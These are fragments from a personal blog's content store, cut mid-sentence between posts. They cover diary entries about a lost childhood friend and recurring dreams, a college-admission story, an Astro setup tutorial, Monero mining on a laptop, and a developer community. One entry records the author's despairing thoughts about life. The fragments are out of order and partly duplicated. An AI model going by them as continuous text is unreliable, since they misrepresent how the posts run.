silence.\nJust the feeling that today… was the worst day of my life.\u003C/p>\n\u003Cp>I was terrified. My body felt like a ticking time bomb, ready to explode any second. My mind was running in circles, chasing every worst-case scenario. I had to act normal. I had to pretend like nothing was wrong. So, casually—very casually—I asked my mom, “What all did you give away?”\u003C/p>\n\u003Cp>She listed some random things—old books, a few electronics. My heart was pounding. Did she see it? Did she open it? What about my diary? What about Harshi’s old class notebook? If my mom had seen them, she would have already killed me. So maybe… maybe she didn’t. Maybe her friend took everything as it was.\u003C/p>\n\u003Cp>But that was even worse. Because now, her friend had it. And at some point, she was definitely going to open it.\u003C/p>\n\u003Cp>The thought made my stomach twist. What if she read everything? What if she found those pages? My notes. My memories. My secrets. She would see everything—the things I never meant for anyone to see. And the moment she did, she would call my mom. And then I was dead.\u003C/p>\n\u003Cp>I couldn’t sleep. Every time I closed my eyes, I saw it happening. My mom picking up the phone. Her face changing. Her voice rising. Then, her footsteps outside my door. Then… nothing.\u003C/p>\n\u003Cp>If my mom’s friend called her in the morning and told her everything—I wouldn’t even wake up. She’d kill me in my sleep. I’d never see the morning again….—\u003C/p>\n\u003Cp>I woke up with a Shake, heart Beating, sweat All over. A dream… it was just a dream. But my hands were still shaking. The fear, the panic—it all felt too real.\u003C/p>\n\u003Cp>And then, my eyes landed on the table. Empty. No CPU. No books. No notes.\u003C/p>\n\u003Cp>Yesterday wasn’t a dream.\u003C/p>\n\u003Cp>My mind was a mess, flashing between the past and present. The last time I had seen that note—Harshi’s note—was during our 5th-grade final exams. She had given me her Maths notebook to copy the notes, and inside, on a loose sheet, in her messy handwriting, she had written:\u003C/p>\n\u003Cp>“I LOVE INDIA.”\u003C/p>\n\u003Cp>Just like that, she was gone. She left school. I didn’t even get to say goodbye. That note, that notebook, was the only thing I had left of her… until I called her again in 8th grade. And now? Gone.\u003C/p>\n\u003Cp>I felt a lump in my throat. Crying. Sobbing. Shaking. Not because of the CPU, not because of the files—because of that one note. I held onto it for so long, and now some random person had it. What should I do?\u003C/p>\n\u003Cp>I didn’t sleep. I pretended to sleep, thinking, planning, spiraling. I didn’t even realize when I actually fell asleep.\u003C/p>\n\u003Cp>I woke up at 7 AM, still pretending, still processing. Silence. My mom was talking to my dad about the market. “Today is Wednesday. We should go today. Sunday will be too crowded. COVID times, you know.”\u003C/p>\n\u003Cp>So far… everything seemed fine.\u003C/p>\n\u003Cp>When they left for the market, I called Nitheesh. Told him everything. He laughed.\n“Bro, just die. If she sees that stuff, she’s gonna kill you anyway. Just die first. Simple.”\u003C/p>\n\u003Cp>Not helping, man. Not helping.\u003C/p>\n\u003Cp>I needed to act fast. I grabbed my mom’s phone. Checked the call history. Yesterday, 10 AM.\u003C/p>\n\u003Cp>Revathi Ma’am.\u003C/p>\n\u003Cp>I knew her. She was a computer teacher.\u003C/p>\n\u003Cp>My World sank. She was the one who took my PC.\u003C/p>\n\u003Cp>I called her. She picked up. I didn’t say a word. I just listened. Waiting. Hoping. If she had opened it, she would definitely talk about it. But she didn’t.\u003C/p>\n\u003Cp>Finally, I asked about my PC. She told me my mom gave it away because I was “wasting time in front of it.” Great. Just great.\u003C/p>\n\u003Cp>I took a deep breath. I had to be careful now.\n“Actually, ma’am, I had some important backups. Photos, files… I need my extra hard disk. There were two inside—one for the OS and one extra. I just need that extra one.”\u003C/p>\n\u003Cp>She laughed.\n“Oh, that? I sold it.”\u003C/p>\n\u003Cp>WHAT?!\u003C/p>\n\u003Cp>My hands went cold.\n“Where did you sell it?”\u003C/p>\n\u003Cp>“It was some wholesale shop. Not sure exactly. But they said they send them to schools after formatting and reinstalling Windows.”\u003C/p>\n\u003Cp>Safe.\u003C/p>\n\u003Cp>They would never find out what was inside. But at what cost? Everything was gone.\u003C/p>\n\u003Cp>I called Rohit. Told him everything. He came over and took me to Central Park, where most second-hand computer shops were. I called Revathi Ma’am again, trying to ask where exactly she sold it. She hesitated. I knew if I pushed too hard, she would definitely tell my mom.\u003C/p>\n\u003Cp>So I hung up.\u003C/p>\n\u003Cp>Then, we asked every shop. “Did anyone sell an Acer PC yesterday?”\u003C/p>\n\u003Cp>“No.”\n“No.”\n“No.”\u003C/p>\n\u003Cp>Every shop. Nothing.\u003C/p>\n\u003Cp>The PC didn’t matter anymore. The note. The memories. The videos. The recordings.\u003C/p>\n\u003Cp>Why was this happening to me?\u003C/p>\n\u003Cp>I went home, exhausted, drained. And there she was. My mom. Waiting.\u003C/p>\n\u003Cp>“Where were you?”\n“Why did you call her about the PC?”\u003C/p>\n\u003Cp>She looked at me like I was an idiot.\n“I told her to take it away. Just focus on JEE Mains first. After your admission, I’ll buy you a new one. This time, you can build your own PC, like you always wanted.”\u003C/p>\n\u003Cp>She wasn’t angry. She did this for me.\u003C/p>\n\u003Cp>And I should have been happy. But inside, I felt nothing.\u003C/p>\n\u003Cp>Because Harshi’s note. The photos.

It wasn’t just about fake birthday wishes; it was about knowing who really thought about me without a digital Popup. And most importantly, it was about Harshi. Would she remember? Or was I just another name in a long list of 'Happy Birthday' notifications she'd tap through like clearing unread messages?\n\nTo make sure no one posted stories or tagged me in birthday posts, I deactivated my Instagram a week before. This wasn’t just a way to disappear for a while—it was part of my plan. If someone really cared, they’d remember on their own, right? No notifications, no reminders, just pure memory. And most importantly, I wanted to see if Harshi would remember. If she really cared, if I really meant something, she wouldn’t need a push from some app.\n\nI had planned to spend the day at home, just chilling with my family. But then these guys—Nitheesh and Jaswanth—kept bugging me to come to Tirupati. I told them straight up, \"I'm not interested. I just want a quiet day.\" Honestly, I was fine meeting just them, but if anyone else saw me, I knew they’d drag me into some unnecessary meetup, and I wasn’t in the mood for all that.\n\nBut they insisted—\"Just come, no celebrations, no extra people, just us three.\" So, after a lot of back and forth, I finally gave in and went. And man, these guys really pulled a fast one on me. They actually threw a surprise party! I wasn’t expecting it at all. We went around to all our old college hangout spots, talked about all the dumb stuff we did back in the day, laughed about the nonsense we used to pull off. It was fun. It was nostalgic. For a moment, I forgot about everything else—just living in the present with the two people who always had my back.\n\nI don’t know why these guys care for me so much. I never really did anything special for them, never went out of my way to help, never spent as much time with them as they did with me. But still, they’ve been there, treating me like I actually matter. And honestly, I kinda hate it—not in a bad way, but in that frustrating way where you just don’t understand why someone cares so much when you feel like you’ve done nothing to deserve it. It’s weird, you know? People like that don’t come around often, and when they do, it makes you overthink—like, why me? What did I do to deserve this kind of loyalty?\n\nThen, around 4 PM, I headed back home to Srikalahasthi. As soon as I reached, I checked my phone.\n\nNo message from her. No call. No wish.\n\nShe forgot. Or maybe she never even cared in the first place.\n\nThat was it. That was all the proof I needed. For years, I had been waiting, convincing myself she was just busy with college, making excuses for her. But now, not even a simple \"Happy Birthday.\" All these years, she probably just sent wishes because some stupid social media app reminded her.\n\nAnd that was the moment of clarity.\n\nAll this time, you kept waiting, holding on to the hope that one day she'd reach out first. But deep down, you always knew the truth. If she truly cared, if you really meant anything to her, she wouldn’t have needed a reminder. She knows how much you love her, how much she means to you, and still, she never made a move—not even for a simple birthday wish. Maybe it was never about being busy. Maybe you just never mattered enough to her. And that realization, as harsh as it was, finally…\n\n---\nRemember, she never asked you to wait. She never said she loved you. This was all in your head. So why keep doing this to yourself? Just tell her how you feel, or let it go completely. Stop wasting time on someone who never once told you she wanted you to wait. She treats you like a childhood friend—nothing more, nothing less. It's not her fault that you're stuck here, replaying memories like they mean something more than they do. Either say what you need to say or move on. But don't keep doing this to yourself for her. She never asked you to.\n\nShe’s just being nice sometimes. Don’t make it complicated. You imagined it all by yourself. The lockdown realization was perfect—you know her perfectly now. She’s nice to everyone—I’m just one of them.

It was right after a severe lockdown due to COVID, and things were far from normal. My final intermediate results weren’t based on an actual public exam but instead were averaged from my 10th-grade marks and my first-year intermediate scores. Thanks to that, I ended up with an 85% score.\n\nLike many others, I tried my luck with JEE Mains. I paid for all four attempts but only ended up taking three. My first attempt got me 48 percentile, which wasn’t great, but I figured I could do better. The second attempt, though, was even worse—I scored just 19 percentile. At that point, I was completely disinterested. The whole system, the reservations, and the way education worked in India just frustrated me. It felt like no matter how hard I tried, getting into an IIT or NIT was nearly impossible. So, I kind of lost hope.\n\nAfter a long break, I decided to give it one more shot and took the third attempt. This time, I really tried my best and ended up with 85 percentile. It was better, but still not enough for a general category student like me. To qualify for JEE Advanced, I needed at least 88 percentile. That was the moment I realized it wasn’t worth trying again for the fourth attempt. I started looking at other college options, ones that most of my classmates and friends were considering—Amrita Vishwa Vidyapeetham, VIT Vellore, LPU, and a few others. I took entrance exams for Amrita (AEEE) and VIT (VITEEE), just in case.\n\nAt the same time, I had a backup plan in mind. If none of these worked out, I could always go for engineering colleges in Tamil Nadu, like RMK, RMKCET, RMD, Panimalar, or Savitha.\n\nThen something surprising happened—I actually got into both Amrita and VIT. That’s when the reality of the engineering admission process hit me. After doing some research, I realized that these entrance exams were basically pointless. Even if I hadn’t taken them, I could have still secured a seat through direct admission. And the fees were exactly the same whether I got in through an entrance exam or just applied directly. That made me question: why were these exams even necessary? It felt like a scam.\n\nWhile I was caught up in all this, my college had applied for APEAMCET on my behalf, so I took that exam too, just for formality. Around the same time, one of my childhood friends, H (not going to mention his full name), suggested that I join SRMIST in Chennai with him. At first, I was excited about the idea, but later, I realized it wasn’t the best move. There was a solid reason why staying with him wasn’t ideal, but that’s a whole different story (maybe I’ll share that another time). Still, just to keep him happy, I went ahead and took the SRM entrance exam.\n\nThen, the APEAMCET results came in. I scored 60 marks and got a rank of 25,363. Not a great rank, but decent enough to secure a spot in local colleges. Now came the real dilemma: where should I go?\n\nI had a few important factors in mind. First, I had always been a day scholar, and the thought of living in a hostel, away from my parents, was honestly scary. Second, I knew I wanted to pursue a master’s degree after my B.Tech, so spending a huge amount on a second-tier college didn’t make sense. I just couldn’t justify wasting that much money on a degree that was mostly about getting a job rather than actual learning.\n\nSo, I decided to apply to colleges near Tirupati. There were about six to seven engineering colleges in my city: Sri Venkateswara University (SVU), SVNE, SVCE, SVEC, SIST, Sree Rama College, and a few others. Among them, SVNE seemed like a great option because both my brother and sister had studied there. I figured it would be a safe choice. But my rank wasn’t quite enough to get into CS at SVNE. Instead, I could only get into other branches there. So, I applied for every CS-related course across multiple nearby colleges, hoping for the best.\n\nThen came the big day—seat allotment. I ended up getting CS at SVEC (Sri Venkateswara Engineering College, Tirupati). I wasn’t thrilled, though. What made it worse was seeing some of my friends, with ranks way lower than mine (like over 100,000), getting into SVNE. That left me feeling really disappointed. But, considering my choices and the costs of private colleges, I accepted my fate.\n\nI had one last discussion with my friend H about everything—the options, the reasoning behind my decisions, and what I planned to do next. He agreed with my choice, and that gave me a little peace of mind. With that, I finalized my admission to SVEC.\n\nAll my documents were submitted, fees were paid, and there was no turning back. Now, all that was left was to see where this journey would take me.","src/content/blogs/CLG1.md","eba3cd0c66992761",{"html":778,"metadata":779},"\u003Cp>Back in 2021, after finishing my intermediate studies at Narayana Junior College in Tirupati, India, I had to make one of the biggest decisions of my life: where to go for college.

I just couldn’t justify wasting that much money on a degree that was mostly about getting a job rather than actual learning.\u003C/p>\n\u003Cp>So, I decided to apply to colleges near Tirupati. There were about six to seven engineering colleges in my city: Sri Venkateswara University (SVU), SVNE, SVCE, SVEC, SIST, Sree Rama College, and a few others. Among them, SVNE seemed like a great option because both my brother and sister had studied there. I figured it would be a safe choice. But my rank wasn’t quite enough to get into CS at SVNE. Instead, I could only get into other branches there. So, I applied for every CS-related course across multiple nearby colleges, hoping for the best.\u003C/p>\n\u003Cp>Then came the big day—seat allotment. I ended up getting CS at SVEC (Sri Venkateswara Engineering College, Tirupati). I wasn’t thrilled, though. What made it worse was seeing some of my friends, with ranks way lower than mine (like over 100,000), getting into SVNE. That left me feeling really disappointed. But, considering my choices and the costs of private colleges, I accepted my fate.\u003C/p>\n\u003Cp>I had one last discussion with my friend H about everything—the options, the reasoning behind my decisions, and what I planned to do next. He agreed with my choice, and that gave me a little peace of mind. With that, I finalized my admission to SVEC.\u003C/p>\n\u003Cp>All my documents were submitted, fees were paid, and there was no turning back. Now, all that was left was to see where this journey would take me.\u003C/p>",{"headings":780,"localImagePaths":781,"remoteImagePaths":782,"frontmatter":783,"imagePaths":786},[],[],[],{"author":17,"pubDatetime":784,"title":767,"slug":764,"featured":726,"draft":24,"tags":785,"description":768},["Date","2022-03-05T15:23:00.000Z"],[344,9,771,772,773,772],[],"CS50CS2024",{"id":787,"data":789,"body":800,"filePath":801,"digest":802,"rendered":803},{"title":790,"description":791,"pubDatetime":792,"author":17,"tags":793,"draft":24,"featured":726,"slug":787,"emoji":25,"pubDate":792},"CS50 Cybersecurity 2024","Signed up for CS50 Cybersecurity out of curiosity, took four months instead of eight weeks, and got the certificate.

It comes silently, like an old memory slipping into my mind when I least expect it. And every time, it feels too real, too familiar—like a place I once knew but somehow lost along the way.\n\nIt always begins the same way. A soft, golden light seeps through the 卐-shaped patterned window, spilling into the quiet classroom. The dust in the air glows as the sunlight touches it. Shadows stretch across the wooden desks, and the air smells of chalk and old books warmed by the sun. A fan hums slowly, lazily, making just enough noise to remind me that time is still moving.\n\nI sit there, lost in the moment—half my face in the light, half in the shadow.\n\nAnd then, I see it—her shadow.\n\nIt falls across the desk beside me, so familiar yet so distant. My heart tightens even before my mind can react. Slowly, as if afraid to break the moment, I follow the shadow. And then, I turn.\n\nI see her.\n\nShe’s sitting right beside me, just like she always did. The same neatly ironed light-and-dark blue school frock, the same twin braids tied with white ribbons. She looks exactly as she did back then, untouched by time. Her presence, her calmness—it makes everything feel right again.\n\nShe turns to me, and for a split second, our eyes meet. A small, effortless smile appears on her face—like she knows something I don’t, like she’s happy to see me, like nothing has changed.\n\nI try to speak. I try to move, to reach out, to tell her something—anything. But I can’t. I have no voice, no hands, no body. It’s like I don’t exist—just a pair of eyes watching, feeling everything but unable to do anything. I try to scream, but there’s only silence.\n\nThe only thing that’s real is her.\n\nAnd then, just like that, she starts to leave.\n\nShe stands up slowly, almost like the whole world is waiting for her to move. My chest tightens, but I can’t stop her. She walks toward the door.\n\nAnd then—\n\nFlicker.\n\nThe scene jumps. Now she’s outside, standing on the school ground, looking back at me. The setting sun paints the sky in orange and gold. I try to follow, but—\n\nFlicker.\n\nNow she’s on the road, walking toward her house. The streetlights flicker on, one by one, the sky turning darker.\n\nFlicker.\n\nShe’s at her house, standing by the old iron gate, holding onto it gently. She turns her head slightly—almost as if she knows I’m there.\n\nAnd suddenly, I’m there too. I don’t know how I got here, but I just wait. Just stand there, watching, hoping she will turn around. The sky darkens, the evening light fades into purple, the air loses its warmth. The street is empty. The temple closes. The world is silent.\n\nAnd still, I wait.\n\nThen, suddenly—\n\nI wake up.\n\nThe same feeling. The same ache in my chest.\n\nThis dream keeps coming back, again and again. And every time, it reminds me of something I can’t quite hold onto.\n\nMaybe some memories never fade. Maybe some people never really leave.\n\nMaybe, just maybe, some dreams are meant to stay forever.\n\nAll of this feels like a game. I keep starting from the same place, like I’m respawning after losing, again and again. Maybe something needs to change for me to move forward, to enter the next level.\n\nBut should I stop here? Should I try to finally figure out where she is going?\n\nI’ve tried. Every time, I think I have. But I have no voice to call her, no hands to hold her back. All I can do is watch.\n\nEven now, after all these years, I still see her. I see her in pictures, in moments that no longer belong to me. But the dream never changes.\n\nNo matter how much she has changed, the dream still clings to the childhood Harshi—the girl who sat beside me, the girl who smiled in the golden evening light.\n\nThe dream refuses to let her grow up.\n\nAnd maybe that’s the saddest part.\n\nReality moves forward, but the dream—\n\nIt just keeps going back in time.","src/content/blogs/Dream.md","738febe4f4a7a0fc",{"html":849,"metadata":850},"\u003Cp>\u003Cstrong>The Dream That Keeps Coming Back\u003C/strong>\u003C/p>\n\u003Cp>I don’t know when it started, but this dream—this same dream—keeps finding me.

Her presence, her calmness—it makes everything feel right again.\u003C/p>\n\u003Cp>She turns to me, and for a split second, our eyes meet. A small, effortless smile appears on her face—like she knows something I don’t, like she’s happy to see me, like nothing has changed.\u003C/p>\n\u003Cp>I try to speak. I try to move, to reach out, to tell her something—anything. But I can’t. I have no voice, no hands, no body.

I try to follow, but—\u003C/p>\n\u003Cp>Flicker.\u003C/p>\n\u003Cp>Now she’s on the road, walking toward her house. The streetlights flicker on, one by one, the sky turning darker.\u003C/p>\n\u003Cp>Flicker.\u003C/p>\n\u003Cp>She’s at her house, standing by the old iron gate, holding onto it gently. She turns her head slightly—almost as if she knows I’m there.\u003C/p>\n\u003Cp>And suddenly, I’m there too. I don’t know how I got here, but I just wait. Just stand there, watching, hoping she will turn around. The sky darkens, the evening light fades into purple, the air loses its warmth. The street is empty. The temple closes. The world is silent.\u003C/p>\n\u003Cp>And still, I wait.\u003C/p>\n\u003Cp>Then, suddenly—\u003C/p>\n\u003Cp>I wake up.\u003C/p>\n\u003Cp>The same feeling.

No familiar voices around, no parents asking me if I ate, nothing. Just silence. I kept telling myself, “You’re not a kid anymore. You need to learn how to stay away, how to survive without them.” And finally, I managed to fall asleep around 9:30 PM.\n\nBut this motherfucker Shanker, man. He just wouldn’t stop talking. He was beside me, on the phone with another Harshitha—yeah, not my Harshi, just some classmate, I think. And he was talking about her, discussing her, saying all sorts of things.

And I had actually asked her—yes, my Harshi—to hug me and kiss me. Just like that. No hesitation, no overthinking, just a stupid kid acting on impulse. I didn’t even know what I was doing or why.

She never made a big deal out of it. Never argued, never teased me, never even mentioned it. It was like she understood that it was just some innocent, kid-like thing. And honestly, that made me feel even more connected to her. It was like, in some way, she liked me too. Like we had this unspoken, childish bond that didn’t need explaining.\n\nAnd then, just like that, it all came rushing back.\n\nI don’t know if I was dreaming or hallucinating, but I was back in school. It was a Saturday—had to be, because I was wearing the white uniform. The school ground, the morning prayer, the faint smell of dust and sweat in the air. I used to be shorter than her back then, so I was standing at the front of the line. And when I turned back, there she was. At the very end of the line, looking straight at me, laughing. Not just a casual laugh, but that playful, teasing laugh she always had.\n\nAnd it felt real. Too real.\n\nI could feel everything—the same nervous excitement I used to get at the start of the school day, the warmth of the sun, the cold morning breeze against my face. It wasn’t just a dream. It was like I had actually traveled back in time, reliving the moment all over again. And when I saw her in that white uniform, something inside me broke. My eyes filled up, and before I knew it, I was crying. Not just in the dream, but in real life too. I was actually crying in my sleep.\n\nThen Shanker shook me awake. “Why the fuck are you crying?” he asked, staring at me like I had lost my mind. I wiped my face quickly, completely embarrassed. What the hell was I supposed to tell him? That I just had a dream about a girl I lost years ago? That I was crying because I saw her in a white school uniform? How do you even explain that without sounding insane?\n\nBut the moment I woke up, and it felt like the earth just collapsed beneath me, pulling me into a dream world created just for us.\n\nShe’s gone. Not today, not recently. She was gone since 2014. And here I am, still acting like I have a chance. Still thinking about her, still seeing her in my dreams, still crying over something that was never mine to begin with.\n\nAnd then, my mind—my own damn brain—started torturing me again.\n\n“Why are you still alive?”\n“Why do you still care?”\n“You lost her.”\n“No, you never even had her.”\n“One day she’ll get married, and then what? You’re just gonna keep living like this?”\n\nAnd for a second, I actually believed it. What’s the point of all this? Exams, studying, planning for a future—why? Just to keep going until she officially moves on? Until she’s someone else’s wife? And then what? Then I just give up on life? What’s the point of trying when the only thing I ever wanted is something I can never have?\n\nAnd that’s when another thought hit me.\n\nMaybe I should just stop trying. Maybe I should just stay home, lock myself in, wait for the right time. Because if she’s not in my future, then what’s the point of writing all these exams, chasing all these stupid goals? If she’s not there at the end of the road, then why am I even walking it?\n\nIt’s a scary thought.

My eyes filled up, and before I knew it, I was crying. Not just in the dream, but in real life too. I was actually crying in my sleep.\u003C/p>\n\u003Cp>Then Shanker shook me awake. “Why the fuck are you crying?” he asked, staring at me like I had lost my mind. I wiped my face quickly, completely embarrassed. What the hell was I supposed to tell him? That I just had a dream about a girl I lost years ago? That I was crying because I saw her in a white school uniform? How do you even explain that without sounding insane?\u003C/p>\n\u003Cp>But the moment I woke up, and it felt like the earth just collapsed beneath me, pulling me into a dream world created just for us.\u003C/p>\n\u003Cp>She’s gone. Not today, not recently. She was gone since 2014. And here I am, still acting like I have a chance. Still thinking about her, still seeing her in my dreams, still crying over something that was never mine to begin with.\u003C/p>\n\u003Cp>And then, my mind—my own damn brain—started torturing me again.\u003C/p>\n\u003Cp>“Why are you still alive?”\n“Why do you still care?”\n“You lost her.”\n“No, you never even had her.”\n“One day she’ll get married, and then what? You’re just gonna keep living like this?”\u003C/p>\n\u003Cp>And for a second, I actually believed it. What’s the point of all this? Exams, studying, planning for a future—why? Just to keep going until she officially moves on? Until she’s someone else’s wife? And then what? Then I just give up on life? What’s the point of trying when the only thing I ever wanted is something I can never have?\u003C/p>\n\u003Cp>And that’s when another thought hit me.\u003C/p>\n\u003Cp>Maybe I should just stop trying. Maybe I should just stay home, lock myself in, wait for the right time. Because if she’s not in my future, then what’s the point of writing all these exams, chasing all these stupid goals? If she’s not there at the end of the road, then why am I even walking it?\u003C/p>\n\u003Cp>It’s a scary thought.

Its key features include:\n\n- **Component-Based Architecture**: Astro uses components to build pages, making it easy to create reusable UI elements.\n- **Built-In Optimization**: Astro optimizes your site for performance out of the box, including features like automatic image optimization and JavaScript loading.\n- **Flexible Rendering**: It supports multiple rendering options, including static site generation (SSG) and server-side rendering (SSR).\n\n## Setting Up the Project\n\n### Step 1: Install Astro\n\nFirst, ensure you have Node.js installed. Then, create a new Astro project by running:\n\n```bash\nnpm create astro@latest\n```\n\nYou’ll be prompted to choose a template. For this project, I selected the \"Blog\" template, which provides a great starting point for a blog site.\n\n### Step 2: Navigate to Your Project\n\nOnce the installation is complete, navigate to your project directory:\n\n```bash\ncd {Your website name}\n```\n\n### Step 3: Install Dependencies\n\nTo install the required dependencies, run:\n\n```bash\nnpm install\n```\n\n### Step 4: Start the Development Server\n\nTo start the development server and see your site in action, run:\n\n```bash\nnpm run dev\n```\n\nIf you encounter issues like the `astro` command not being found, make sure Astro is installed locally or globally, as explained in the troubleshooting section above.\n\n## Customizing Your Blog\n\n### Adding Blog Posts\n\nAstro uses Markdown for blog posts. To add a new post, create a new Markdown file in the `src/pages/posts/` directory. Here’s an example:\n\n```markdown\n---\ntitle: \"My First Post\"\ndate: \"2024-09-01\"\n---\n\nWelcome to my new blog! This is my first post using Astro.\n```\n\n### Customizing the Layout\n\nAstro uses a component-based layout system. You can customize your blog’s layout by editing the components in `src/components/`. For example, you might want to adjust the `Header.astro` or `Footer.astro` components to fit your design preferences.\n\n### Styling Your Blog\n\nStyling in Astro can be done using CSS, Sass, or even CSS-in-JS solutions. By default, Astro includes a global stylesheet located in `src/styles/global.css`. You can modify this file or add your own styles to customize the look and feel of your blog.\n\n## Building and Deploying\n\nOnce you’re happy with your blog, you can build it for production:\n\n```bash\nnpm run build\n```\n\nThis will generate static files in the `dist/` directory. You can deploy these files to any static hosting provider, such as Netlify, Vercel, or GitHub Pages.\n\n## Conclusion\n\nCreating a blog with Astro was a smooth and enjoyable experience.

From learning about blockchain, Proof of Work, and mining pools to facing MacOS restrictions and hardware limitations, this experiment turned into a crash course in crypto. While I didn’t strike gold, I walked away with valuable insights into the world of Bitcoin mining. Curious to know what went down? Check it out!",["Date","2022-01-08T10:22:00.000Z"],[1194,9,1195,1196],"Crypto","Bitcoin","Blockchain","Back in *August 2021*, I copped myself a brand-new MacBook Air M1 for college work since I was studying Computer Science. At the time, I kept hearing about Bitcoin and blockchain, but honestly, I had no clue what it really was besides being some kind of internet money. So, my curious brain kicked in—what even is blockchain? How do people mine Bitcoin? And, more importantly, could I make my own coin and get rich? With all these thoughts buzzing in my head, I decided to dive deep into the crypto rabbit hole.\n\nAt first, I thought Bitcoin was just a digital coin, but turns out, it’s an entire freakin’ technology. It’s built on this thing called **blockchain**, which is basically a digital ledger that keeps records of transactions without needing some big boss like a bank to handle everything. Instead, it spreads data across a bunch of computers, making it nearly impossible to mess with. Every transaction gets packed into a block, and each block links to the previous one using some fancy cryptographic hashing—boom, that’s how the “chain” in blockchain happens. This whole setup makes everything super secure and transparent, which is why people are hyped about it.\n\nWhile going down this crypto rabbit hole, I kept running into these terms—Proof of Work (PoW) and Proof of Stake (PoS). Proof of Work is how Bitcoin keeps its network legit. Miners have to solve these crazy-hard puzzles, and whoever cracks it first gets to add a new block to the blockchain and score some Bitcoin as a reward. But it ain’t easy—this process takes a ridiculous amount of computing power, so if you don’t have some heavy-duty mining rigs, you’re basically outta luck.\n\nBack in the day, mining Bitcoin was like a gold rush.

At the time, I kept hearing about Bitcoin and blockchain, but honestly, I had no clue what it really was besides being some kind of internet money. So, my curious brain kicked in—what even is blockchain? How do people mine Bitcoin? And, more importantly, could I make my own coin and get rich? With all these thoughts buzzing in my head, I decided to dive deep into the crypto rabbit hole.\u003C/p>\n\u003Cp>At first, I thought Bitcoin was just a digital coin, but turns out, it’s an entire freakin’ technology. It’s built on this thing called \u003Cstrong>blockchain\u003C/strong>, which is basically a digital ledger that keeps records of transactions without needing some big boss like a bank to handle everything. Instead, it spreads data across a bunch of computers, making it nearly impossible to mess with. Every transaction gets packed into a block, and each block links to the previous one using some fancy cryptographic hashing—boom, that’s how the “chain” in blockchain happens. This whole setup makes everything super secure and transparent, which is why people are hyped about it.\u003C/p>\n\u003Cp>While going down this crypto rabbit hole, I kept running into these terms—Proof of Work (PoW) and Proof of Stake (PoS). Proof of Work is how Bitcoin keeps its network legit. Miners have to solve these crazy-hard puzzles, and whoever cracks it first gets to add a new block to the blockchain and score some Bitcoin as a reward. But it ain’t easy—this process takes a ridiculous amount of computing power, so if you don’t have some heavy-duty mining rigs, you’re basically outta luck.\u003C/p>\n\u003Cp>Back in the day, mining Bitcoin was like a gold rush.

This journey started way before the community even existed — back when I was just another solo dev, picking up random projects and diving headfirst into stuff without really knowing what I was doing.\n\nFor the past few years, I’ve been in that phase where I was building just for the sake of building. I never waited to become an “expert” in anything — I was the type to see something that looked cool and just go for it. Sometimes it worked out, but more often than not, I found myself in over my head. I’d get stuck on some crazy bug or some issue that I had absolutely no idea how to solve. And without a mentor, or even a senior dev to ask for help, I was left on my own — trying to troubleshoot at 11 PM, googling random solutions and hoping something would work.\n\nSome nights, I’d stay up for hours, struggling with code, desperately trying to figure out how to move forward. Occasionally, I’d stumble across the answer — the sweet satisfaction of solving a problem after an all-nighter. But most of the time, I wouldn’t find a solution, and I’d have to just walk away, feeling frustrated. And here’s the thing: this wasn’t a one-off thing. It happened over and over again. Projects would start with a lot of excitement, only to end up abandoned halfway through. Not because I didn’t care, but because I just didn’t know what to do next. I was stuck.\n\nAt some point, I realized that I couldn’t be the only one going through this. So, I started reaching out to people — other devs, more experienced than me, from different fields of coding. Some of them ignored me. Some ghosted me entirely. But a lot of them actually took the time to reply. They helped me, shared their knowledge, and even collaborated on projects with me. Slowly but surely, I started learning more and improving my skills. I realized that the real power came from community — from sharing ideas and solving problems together.\n\nAnd then it hit me — why not create a space for others like me? A place where people who are stuck, people who are just starting out or learning by doing, can come together and help each other. Not a fancy startup or a perfectly polished community, but a real, raw place where devs could connect, collaborate, and grow together. And that’s how Krypto Hashers Community (KHC) was born.\n\nAt first, the community was all about crypto projects. That’s where I was putting most of my energy, so it made sense to keep it focused on that. But over time, KHC grew into something deeper — something more personal. I realized that KHC didn’t just have to be about crypto. It could be a place for anyone who was building, learning, or struggling — anyone who needed help and wanted to grow. So, I decided to keep the name, even though it had a deep personal meaning for me. I didn’t want to change it. KHC had become more than just a space for crypto devs. It had become a community for anyone trying to build, learn, and not get stuck alone.\n\nLooking back, it’s crazy how much has changed since I first started. I went from working solo to collaborating with some amazing devs. I’ve learned so much from them, and hopefully, they’ve learned something from me too.

The idea of generating digital gold with just a computer was exhilarating, but reality hit hard. My MacBook Air M1, despite being a beast for regular tasks, was nowhere near powerful enough to mine Bitcoin. Apple’s security restrictions, the insane computational power needed, and the ridiculous energy costs made it a lost cause. But my curiosity wasn’t satisfied just yet—I needed to explore more. That’s when I discovered Monero (XMR).\n\nUnlike Bitcoin, Monero wasn’t just another cryptocurrency; it was privacy-focused and built to be mined using CPUs rather than expensive ASIC rigs. It ran on the RandomX algorithm, designed specifically to make mining accessible to people with regular computers. That sounded like a golden opportunity—finally, a chance to actually mine something with my laptop! With renewed excitement, I decided to dive into Monero mining, hoping for better results.\n\n### **Setting Up for the Mining Expedition**\n\nBefore getting my hands dirty, I needed a few essentials—a crypto wallet, mining software, and a mining pool. Since Monero is all about security and anonymity, I chose MyMonero, an offline wallet that keeps your coins safe from online threats. For mining software, the go-to option everyone recommended was XMRig, which fully supports the RandomX algorithm. And since solo mining was pretty much a waste of time without industrial-grade hardware, I opted for pool mining with MoneroOcean to at least have a chance at earning something.\n\nWith everything set up, I launched XMRig, connected to the mining pool, and watched as my MacBook started solving hash puzzles. Seeing those tiny cryptographic calculations happening in real-time was strangely satisfying. The software accepted my hash results, meaning I was officially mining Monero!\n\n### **The Harsh Realities of Mining on a MacBook**\n\nMy initial excitement didn’t last long. Within minutes, my CPU usage spiked to 100%, completely locking up my laptop. The MacBook’s sleek, silent design suddenly turned into a jet engine, with the fans working overtime to cool it down. The temperature shot up to a scorching 90°C, and I was genuinely afraid my laptop might die on me.\n\nBut I was determined. I let it mine for eight straight hours, watching my laptop struggle, hoping the rewards would justify the effort. When I finally checked my earnings, reality smacked me in the face—I had mined a whopping **0.0002 XMR**, which was worth about **₹5 ($0.05)**. That’s right, after hours of pushing my MacBook to its limits, I had earned less than the cost of electricity it consumed.\n\n### **Was It Worth It?**\n\nAfter running some quick calculations, the numbers were brutal. With my Mac’s hash rate of around **2 KH/s**, I would only make around ₹30-40 per month—at the cost of putting extreme stress on my laptop’s hardware. The energy consumption, overheating risks, and the lack of profitability made it painfully clear: mining Monero on a regular laptop was a terrible idea.\n\nIf even a CPU-optimized coin like Monero wasn’t profitable on a MacBook, then mining Bitcoin or any other major cryptocurrency was completely out of the question. Without ASIC miners, it’s just not feasible. Plus, with India’s high electricity costs and warm climate, running a mining rig here would be a losing battle.\n\n### **Final 